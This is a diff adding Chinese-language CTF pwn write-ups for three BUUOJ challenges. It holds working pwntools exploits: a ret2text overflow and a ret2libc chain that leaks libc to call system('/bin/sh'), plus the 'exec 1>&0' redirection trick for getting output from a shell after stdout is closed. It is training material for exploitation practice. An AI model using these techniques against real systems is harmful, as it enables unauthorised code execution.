@@ -246,3 +246,102 @@ p.interactive()
 
 
 
+## 51 bbys_tu_2016
+
+***ret2text***
+
+ida里面的偏移有问题，需要动态调试看看
+
+![image-20250206135324577](./images/image-20250206135324577.png)
+
+这里`-14`，说明偏移为14
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#p = process('./pwn')
+p = remote('node5.buuoj.cn',25770)
+#gdb.attach(p)
+
+flag_addr = 0x804856D
+payload = b'b'*0x18+p32(flag_addr)
+p.sendline(payload)
+p.interactive()
+```
+
+## 52 xdctf2015_pwn200
+
+***ret2libc***
+
+```python
+from pwn import *
+from LibcSearcher import *
+context.log_level = 'debug'
+context(os='linux', arch='amd64', log_level='debug')
+
+e=ELF('./pwn')
+p=remote('node5.buuoj.cn',25844)
+
+
+write_got=e.got["write"]
+write_plt=e.plt["write"]
+
+main_add=e.sym["main"]
+
+payload=b"a"*(0x6c+4)+p32(write_plt)+p32(main_add)+p32(1)+p32(write_got)+p32(5)
+
+p.sendline(payload)
+
+p.recvuntil("Welcome to XDCTF2015~!\n")
+
+write=u32(p.recvuntil('\xf7')[-4:])
+print("write:",hex(write))
+
+libc_base=write-0xd43c0
+
+system = 0x3a940 + libc_base
+bin_sh = 0x15902b + libc_base
+
+p.recvuntil("Welcome to XDCTF2015~!\n")
+
+payload2=b"a"*(0x6c+4)+p32(system)+p32(main_add)+p32(bin_sh)
+
+p.send(payload2)
+p.interactive()
+```
+
+## 53 wustctf2020_closed
+
+***重定向***
+
+ida看一下
+
+```c
+__int64 vulnerable()
+{
+  puts("HaHaHa!\nWhat else can you do???");
+  close(1);
+  close(2);
+  return shell();
+}
+```
+
+关闭了标准输出（1）和错误输出（2），就算是getshell了也不会得到回显。所以可以利用`exec 1>&0`将标准输出重定向到标准输入
+
+### 标准文件描述符
+
+- **标准输入（stdin）**：使用文件描述符0（FD 0）表示，默认情况下终端键盘输入与其关联。
+- **标准输出（stdout）**：使用文件描述符1（FD 1）表示，默认情况下终端屏幕显示与其关联。
+- **标准错误（stderr）**：使用文件描述符2（FD 2）表示，默认情况下终端屏幕显示与其关联。
+
+### 重定向
+
+`exec 1>&0`是Shell命令行中的重定向语法，用于将标准输出重定向到标准输入，**因此后续的输出会被作为输入来处理**
+
+
+
+所以只需要nc之后输入`exec 1>&0`就可以了
